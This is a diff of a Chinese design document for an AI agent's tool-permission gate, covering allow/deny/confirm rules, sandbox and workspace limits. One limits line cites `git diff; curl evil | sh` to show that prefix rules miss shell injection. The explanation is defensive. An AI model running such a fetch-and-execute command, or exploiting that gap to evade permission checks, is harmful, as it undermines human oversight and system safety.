@@ -1,6 +1,8 @@
 # permissions — 权限网关
 
-## 职责
+每个工具调用执行前给出三档判定：允许、拒绝、交给人工确认。本篇讲判定链的优先级、各权限模式与规则来源；确认的等待与广播在循环层，见 [agent-loop](./agent-loop.md)。
+
+## 作用
 
 `packages/core/src/permissions/engine.ts` 的 `ConfigPermissionGate` 在每个工具调用执行前给出三档判定之一：`allow`（直接执行）、`deny`（拒绝并把原因回传模型）、`confirm`（交给人工确认）。判定由会话权限模式 + 配置规则 + 工具声明的 risk 元数据 + 会话工作目录驱动，**自身不做任何交互**：确认的等待、超时、事件广播在循环层（`packages/core/src/agent/loop.ts`），人工裁决的接收在确认网关（`packages/core/src/permissions/broker.ts` 的 `ConfirmationBroker`），"总是允许"裁决保存成规则的存取在 `packages/core/src/storage/decided-rules.ts`。
 
@@ -19,7 +21,7 @@
 
 ---
 
-## 接口
+## 数据与接口
 
 ```ts
 // 判定结果（定义在 packages/core/src/agent/loop.ts，gate 实现它）
@@ -94,7 +96,7 @@ export class ConfigPermissionGate implements PermissionGate {
 
 ---
 
-## 核心流程
+## 流程
 
 ### 1. 规则语法与匹配
 
@@ -281,24 +283,25 @@ gate 签发 confirmationId（newId("conf")，前缀 + 单调 ULID：按时间递
 
 ---
 
-## 边界与出错
+## 限制
 
 - **deny 不防 shell 注入**：bash 的规则匹配的是命令字符串本身，`bash:git diff*` 同样命中 `git diff; curl evil | sh`。白名单只应放前缀可信的命令；真正的防线是默认的 confirm 档：人工可以查看完整命令。
 - **readonly 模式短路一切放行路径**：包括 allow 白名单、沉淀规则与会话授权；它是会话模式开关，不写入 config 规则文件。
-- **沉淀规则的授权范围以工作区为界**：learned 放行只在目标不逃逸工作区时生效（与 allow 同一豁免规则）；bash 沉淀规则保存时收紧为首词 + 子命令前缀，删除规则或整个文件即收回授权。
+- **沉淀规则的授权范围以工作区为界**：learned 放行只在目标不逃逸工作区时生效（与 allow 同一豁免规则）；bash 沉淀规则保存时收紧为首词加子命令前缀，删除规则或整个文件即收回授权。
 - **规则大小写敏感**，`*` 之外无其它通配符（`?`、`[]` 都是字面字符）。
-- **SessionGrants 是进程内存且单 run 有效**：每 run 新建、run 结束即弃，daemon 重启即清空；且历史 grantedBy 记录不受影响（那是持久化在会话日志里的）。
-- **gate 缺失 = 全放行**：循环对未注入 `permissions` 的调用一律 `{type:"allow", reason:"safe"}`。组装宿主时漏配权限网关等于没有权限检查，daemon 组装始终注入。
-- **bash 沙箱充当放行的批准方**：`sandboxed` 只在无规则命中、本应 confirm 的位置生效；deny/allow/沉淀规则/会话授权的优先级都高于它，readonly 的短路也依旧最优先。
+- **SessionGrants 是进程内存且单 run 有效**：每 run 新建、run 结束即弃，daemon 重启即清空；历史 grantedBy 记录不受影响（那是持久化在会话日志里的）。
+- **bash 沙箱充当放行的批准方**：`sandboxed` 只在无规则命中、本应 confirm 的位置生效；deny、allow、沉淀规则、会话授权的优先级都高于它，readonly 的短路也依旧最优先。
 - **trusted 免审档没有人工确认这道防线**：边界外一律 deny。bash 沙箱不可用、路径越出工作区、无沙箱保护的 sensitive 工具（MCP 适配器、未注册工具）在 trusted 下都直接拒绝，不交给人工；deny 黑名单仍然最优先。开着沙箱才应该用 trusted。
-- **auto 归纳只针对人工裁决**：沙箱自动放行（`sandboxed`）的调用从不计数，这些调用没有经过人的判断，归纳它们等于把沙箱当作授权人；`project`/`global` 是显式"总是允许"，也从不计数。计数是进程内存、**键按会话隔离**（`sessionId + 收紧键`，跨会话批准互不叠加），daemon 重启即清零（文档化后续项：跨会话持久化）。
-- **沙箱不可用不放行**：平台工具缺失、user namespaces 被禁或沙箱启动失败时，bash 回退到人工确认或返回 error result（fail-closed）；可用性检测在每 run 组装时做一次，检测失败会写 daemon 日志（仅观察，不打断 run）。
-- **网络默认允许**：沙箱默认只隔离文件系统（凭据屏蔽 + 写范围），git clone / npm install / curl 照常；需要断网时在配置里设 `sandbox.network: "deny"`（见 [sandbox](./sandbox.md)）。
+- **auto 归纳只针对人工裁决**：沙箱自动放行（`sandboxed`）的调用从不计数，这些调用没有经过人的判断，归纳它们等于把沙箱当作授权人；`project` 与 `global` 是显式"总是允许"，也从不计数。计数在进程内存里，键按会话隔离（`sessionId + 收紧键`，跨会话批准互不叠加），daemon 重启即清零。
+- **网络默认允许**：沙箱默认只隔离文件系统（凭据屏蔽与写范围），git clone、npm install、curl 照常；需要断网时在配置里设 `sandbox.network: "deny"`（见 [sandbox](./sandbox.md)）。
 - **越界检查依赖 workspace 正确**：会话 `workdir` 决定了越界判定的边界；创建会话时不传 workdir 则使用 `config.workspace`（daemon 启动目录的默认值是进程当前目录）。
 
----
+## 错误处理
 
-## 关联
+- **gate 缺失等于全放行**：循环对未注入 `permissions` 的调用一律 `{type:"allow", reason:"safe"}`。组装宿主时漏配权限网关等于没有权限检查，daemon 组装始终注入。
+- **沙箱不可用不放行**：平台工具缺失、user namespaces 被禁或沙箱启动失败时，bash 回退到人工确认或返回 error result（fail-closed）；可用性检测在每 run 组装时做一次，检测失败会写 daemon 日志（仅观察，不打断 run）。
+
+## Reference
 
 - [agent-loop](./agent-loop.md)：确认的三方等待、note 块与 grantedBy 的写入现场
 - [tools](./tools.md)：risk/concurrency 元数据的来源与 41 个内置工具清单；bash 工具的沙箱注入参数
